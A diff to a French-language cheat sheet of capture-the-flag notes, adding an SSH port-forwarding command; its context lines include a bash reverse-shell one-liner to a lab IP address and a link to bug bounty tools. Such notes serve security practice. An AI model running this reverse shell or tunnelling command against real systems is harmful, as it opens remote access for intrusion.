@@ -24,6 +24,8 @@
 
 - `bash -i >& /dev/tcp/10.8.218.133/1234 0>&1` --> Elévation de privilèges
 
+- SSH Port Forwording --> `ssh sau@10.10.11.214 -L 8000:127.0.0.1:80` (attaquant --> 8000, victime --> 80)
+
 ### Tools
 
 - [BugBountyTool](https://github.com/vavkamil/awesome-bugbounty-tools) (regroupe les tools CTF)
